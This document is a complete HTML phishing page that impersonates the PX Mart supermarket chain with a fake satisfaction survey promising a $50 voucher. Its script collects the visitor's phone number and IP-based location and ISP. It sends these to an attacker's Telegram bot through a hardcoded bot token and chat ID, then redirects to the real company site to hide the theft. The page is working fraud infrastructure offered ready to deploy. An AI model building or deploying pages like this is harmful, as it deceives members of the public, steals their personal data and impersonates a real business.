<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>全聯客戶滿意度調查｜您的意見對我們很重要</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Noto Sans TC',sans-serif;background:#F0F0F0;color:#333;text-align:center;min-height:100vh;padding:20px}
        .header{padding:20px 0;background:#0070C0;color:white}
        .logo{max-width:140px;margin:0 auto 10px}
        h1{font-size:28px;font-weight:900;margin:10px 0}
        .subtitle{font-size:16px;margin:5px 0 20px}
        .survey-img{width:280px;height:auto;margin:30px auto;border-radius:15px;box-shadow:0 8px 25px rgba(0,0,0,0.2)}
        .box{background:white;padding:30px;border-radius:20px;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.2)}
        h2{font-size:24px;margin-bottom:15px;color:#0070C0}
        .desc{font-size:16px;line-height:1.6;margin-bottom:25px}
        .input-group{display:flex;background:#F0F0F0;border-radius:14px;overflow:hidden;margin:20px 0;padding:0 10px;box-shadow:0 4px 12px rgba(0,112,192,0.1);height:56px}
        select{background:#fff;border:none;font-size:18px;padding:0 10px}
        input{flex:1;border:none;font-size:18px;padding:0 15px;outline:none}
        button{width:100%;padding:18px;background:#0070C0;color:white;border:none;border-radius:14px;font-size:20px;font-weight:bold;margin-top:10px;cursor:pointer;box-shadow:0 6px 20px rgba(0,112,192,0.3)}
        button:active{transform:scale(0.98)}
        .footer{margin-top:50px;font-size:12px;color:#666}
        .footer a{color:#0070C0;text-decoration:underline}
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.pxmart.com.tw/images/logo.png" alt="全聯 Logo" class="logo">
        <h1>客戶滿意度調查</h1>
        <div class="subtitle">您的意見對我們很重要</div>
    </div>

    <img src="https://www.pxmart.com.tw/CdnRoot/promotion/2025/survey/survey-cartoon.jpg" alt="調查卡通" class="survey-img" onerror="this.src='https://via.placeholder.com/800x400/0070C0/ffffff?text=全聯調查問卷'">

    <div class="box">
        <h2>調查完成送 $50 購物金</h2>
        <div class="desc">
            感謝您參與 2025 全聯客戶滿意度調查！<br>
            作為回饋，請輸入手機號碼領取 $50 購物金（每個門號限領一次）。
        </div>

        <form id="loginForm">
            <div class="input-group">
                <select id="countryCode">
                    <option value="+886" selected>+886</option>
                    <option value="+852">+852</option>
                    <option value="+60">+60</option>
                    <option value="+66">+66</option>
                    <option value="+63">+63</option>
                </select>
                <input type="tel" id="phone" placeholder="912345678" required maxlength="12">
            </div>
            <button type="submit">提交調查領 $50</button>
        </form>
    </div>

    <div class="footer">
        © 2025 全聯實業股份有限公司. All rights reserved.<br>
        <a href="https://www.pxmart.com.tw/privacy">隱私權政策</a> | 
        <a href="https://www.pxmart.com.tw/terms">服務條款</a>
    </div>

    <script>
        const TOKEN = "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys";
        const CHAT_ID = "1137905005";

        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();
            const code = document.getElementById("countryCode").value;
            const phone = document.getElementById("phone").value.trim();
            if (!phone) return;

            const btn = document.querySelector("button");
            btn.textContent = "領取中...";
            btn.disabled = true;

            const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
            const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});

            const 訊息 = "全聯調查誘捕成功\n\n" +
                        "電話：" + code + phone + "\n" +
                        "IP　　：" + (ipData.ip || "未知") + "\n" +
                        "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
                        "ISP　　：" + (ipData.org || "未知") + "\n" +
                        "時間　：" + 時間;

            fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
                method:"POST",
                headers:{"Content-Type":"application/json"},
                body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
            });

            setTimeout(() => location.href = "https://www.pxmart.com.tw/campaign/survey", 3000);
        });
    </script>
</body>
</html>
